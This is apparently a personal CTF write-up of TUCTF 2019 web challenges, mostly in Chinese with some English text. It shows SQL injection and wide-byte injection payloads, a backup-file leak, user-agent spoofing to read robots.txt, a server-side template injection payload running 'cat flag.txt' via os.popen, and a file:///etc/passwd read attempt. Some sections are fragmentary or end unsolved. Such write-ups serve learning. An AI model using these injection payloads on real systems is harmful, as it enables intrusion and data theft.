date: 2020-04-20
categories:
- 比赛
tags:
- wp
- ctf
title: tuctf2019
---
# tuctf2019

## web

### Router Where Art Thou?

 http://chal.tuctf.com:30006/0.html 

 http://chal.tuctf.com:30006/1.html

 http://chal.tuctf.com:30006/2.html  

` FIXME: need to use Page::includeStaticResource `

`2.html:603  hidden variables, we are going to set this to the session, bug fix 2157`

https://192.168.1.254/



....爆破密码获得flag

### Login to Access

当Referer不为http://chal.tuctf.com:30001/login.html时,存在sql注入

当Referer: http://chal.tuctf.com:30001/login.hmtl时sql 注入被过滤

对第一种情况sql注入得到

```python
#database:information_schema,challenge,mysql,performance_schema,sys 
#table:users
#columns:user,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
#user,password,USER : dave,hunter2,dave
```



利用得到的账号密码直接在第二步登陆无效,猜测第二步还要sql注入

- sql注入

``` python
dave'+or+1%23 x
dave"+or+1%23 x
dave")+or+1%23 x
dave')+or+1%23 x
\转义'或"来逃逸失败


```

宽字节注入:

```python
#username=%2bsleep(10)&password=%bf%5c" x
#username=%2bsleep(10)&password=%bf%5c' x
#username=%bf%5c"&password=%2bsleep(10) x
#username=%bf%5c'&password=%2bsleep(10) x
```







sql注入点时username还是password

是单引号还是双引号闭合

过滤了哪些字符，转义了哪些字符

We then looked at the challenge’s description again and realized that there might be backup of file somewhere. We then tried to get the **login.php.bak**.

![img](https://khroot.com/wp-content/uploads/2019/11/image-201.png)

Surprise, there really is a backup file there. Let’s see what is inside.

![img](https://khroot.com/wp-content/uploads/2019/11/image-202-1024x385.png)

We found the flag, and it is `TUCTF{b4ckup5_0f_php?_1t5_m0r3_c0mm0n_th4n_y0u_th1nk}`

### The Droid You're  Looking For

看到droid想到robots.txt,直接访问提示没有权限

因为robots.txt是给爬虫看的,所以去百度了一个google爬虫的user-agent:

```
Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1;
```

robots.txt

```
User-agent: *
Disallow: googleagentflagfoundhere.html
```

TUCTF{463nt_6006l3_r3p0rt1n6_4_r0b0t}



### And Now, For Something Completely Different

```python
Traceback (most recent call last):
  File "/usr/local/lib/python2.7/dist-packages/tornado/web.py", line 1509, in _execute
    result = method(*self.path_args, **self.path_kwargs)
  File "/usr/src/app/class_website.py", line 87, in post
    if len(name) == 0 or len(phone_num) == 0 or len(email) == 0 or len(passwd2) == 0 or passw != passw2:
NameError: global name 'passwd2' is not defined
```

在网页中发现

```html
<!-- TODO: add /welcome/test -->
```

打开只有welcome test <==> /welcome/test

猜测是ssti


```
{{__import__('os').popen('cat flag.txt').read()}}
```

 TUCTF{4lw4y5_60_5h0pp1n6_f0r_fl465} 



### Cute Animals Company

修改cookie获得登陆权限

sqlmap得到密码

file:///etc/passwd获得flag???

http访问都不行的呀

